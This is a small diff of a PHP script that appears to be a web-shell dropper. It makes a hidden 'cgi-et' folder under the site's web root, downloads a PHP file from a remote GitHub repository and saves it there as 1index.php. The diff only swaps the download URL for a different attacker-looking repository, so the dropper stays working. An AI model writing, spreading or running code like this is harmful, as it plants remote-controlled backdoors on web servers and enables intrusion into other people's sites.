@@ -5,7 +5,7 @@ mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-et");
 echo('Eec secra');    
 
 
-$file = sexx('https://raw.githubusercontent.com/HecSec/New/main/wp-activate.php');
+$file = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/und.php');
 $local=$_SERVER['DOCUMENT_ROOT']."/cgi-et/1index.php";
 if(file_put_contents($local, $file));   
 
